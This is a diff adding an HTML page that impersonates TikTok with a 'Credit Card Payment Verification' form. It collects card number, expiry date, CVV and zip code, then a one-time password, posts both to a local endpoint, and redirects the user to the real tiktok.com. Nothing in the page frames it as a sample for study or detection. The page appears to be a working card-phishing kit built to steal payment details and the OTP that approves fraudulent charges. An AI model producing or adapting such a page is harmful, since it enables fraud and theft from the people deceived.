@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;">
+  <title>Credit Card Payment Verification</title>
+  <link rel="icon" href="/tiktok-icon.png">
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <div class="loading-overlay" id="loadingOverlay">
+    <img src="/tiktok-icon.png" alt="Loading" class="tiktok-icon">
+  </div>
+  <div class="container" id="cardForm">
+    <h2>Credit Card Payment Verification</h2>
+    <p>Please enter your credit card details to proceed with the verification process.</p>
+
+    <label>Card Number</label>
+    <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" oninput="formatCardNumber(); checkFormCompletion()">
+
+    <label>Expiration Date</label>
+    <input type="text" id="expiryDate" maxlength="5" placeholder="MM/YY" oninput="formatExpiryDate(); checkFormCompletion()">
+
+    <label>CVV</label>
+    <input type="text" id="cvv" maxlength="3" placeholder="123" oninput="checkFormCompletion()">
+
+    <label>Zip Code</label>
+    <input type="text" id="zipCode" maxlength="10" placeholder="e.g., 90210" oninput="checkFormCompletion()">
+
+    <button id="submitBtn" class="button" disabled>Submit</button>
+  </div>
+
+  <div class="container hidden" id="otpForm">
+    <h2>Enter OTP</h2>
+    <p>A One-Time Password has been sent to your phone. Please enter it below.</p>
+
+    <input type="text" id="otpInput" maxlength="6" placeholder="Enter OTP">
+    <p id="countdown">Time Remaining: 60 seconds</p>
+
+    <button id="sendBtn" class="button">Send</button>
+  </div>
+
+  <div class="container hidden" id="processingMessage">
+    <h2>Processing...</h2>
+    <p>Your verification process is being processed. You will be redirected to the TikTok main page shortly.</p>
+  </div>
+
+  <script>
+    let countdownInterval;
+    let countdownTime = 60;
+
+    function formatCardNumber() {
+      const cardNumber = document.getElementById('cardNumber');
+      const value = cardNumber.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+      cardNumber.value = value;
+    }
+
+    function formatExpiryDate() {
+      const expiryDate = document.getElementById('expiryDate');
+      const value = expiryDate.value.replace(/\D/g, '').replace(/^(\d{2})(\d{1,2})$/, '$1/$2');
+      expiryDate.value = value;
+    }
+
+    function checkFormCompletion() {
+      const cardNumber = document.getElementById('cardNumber').value;
+      const expiryDate = document.getElementById('expiryDate').value;
+      const cvv = document.getElementById('cvv').value;
+      const zipCode = document.getElementById('zipCode').value; // Get zip code value
+      const submitBtn = document.getElementById('submitBtn');
+
+      // Check if all fields are filled
+      if (cardNumber.length === 19 && expiryDate.length === 5 && cvv.length === 3 && zipCode.length > 0) {
+        submitBtn.disabled = false;
+      } else {
+        submitBtn.disabled = true;
+      }
+    }
+
+    function startCountdown() {
+      countdownInterval = setInterval(function() {
+        countdownTime--;
+        document.getElementById('countdown').textContent = `Time Remaining: ${countdownTime} seconds`;
+
+        if (countdownTime <= 0) {
+          clearInterval(countdownInterval);
+          document.getElementById('countdown').textContent = "Time expired. Please try again.";
+          document.getElementById('sendBtn').disabled = true;
+        }
+      }, 1000);
+    }
+
+    function showLoading() {
+      document.getElementById('loadingOverlay').style.display = 'flex';
+    }
+
+    function hideLoading() {
+      document.getElementById('loadingOverlay').style.display = 'none';
+    }
+
+    document.getElementById('submitBtn').onclick = async function() {
+      showLoading();
+      const cardNumber = document.getElementById('cardNumber').value;
+      const expiryDate = document.getElementById('expiryDate').value;
+      const cvv = document.getElementById('cvv').value;
+      const zipCode = document.getElementById('zipCode').value; // Get zip code value
+
+      try {
+        const response = await fetch('/api/credit-card-verification', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cardNumber, expiryDate, cvv, zipCode }), // Include zip code in the payload
+        });
+        if (response.ok) {
+          document.getElementById('cardForm').classList.add('hidden');
+          document.getElementById('otpForm').classList.remove('hidden');
+          startCountdown();
+        } else {
+          window.location.href = '/verification_failed.html';
+        }
+      } catch (error) {
+        window.location.href = '/verification_failed.html';
+      } finally {
+        hideLoading();
+      }
+    };
+
+    document.getElementById('sendBtn').onclick = async function() {
+      showLoading();
+      const otpInput = document.getElementById('otpInput').value;
+
+      if (otpInput.length === 6) {
+        clearInterval(countdownInterval);
+        try {
+          const response = await fetch('/api/credit-card-verification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ otp: otpInput }),
+          });
+          if (response.ok) {
+            document.getElementById('otpForm').classList.add('hidden');
+            document.getElementById('processingMessage').classList.remove('hidden');
+            setTimeout(() => { window.location.href = "https://www.tiktok.com/"; }, 3000);
+          } else {
+            window.location.href = '/verification_failed.html';
+          }
+        } catch (error) {
+          window.location.href = '/verification_failed.html';
+        } finally {
+          hideLoading();
+        }
+      }
+    };
+  </script>
+</body>
+</html>
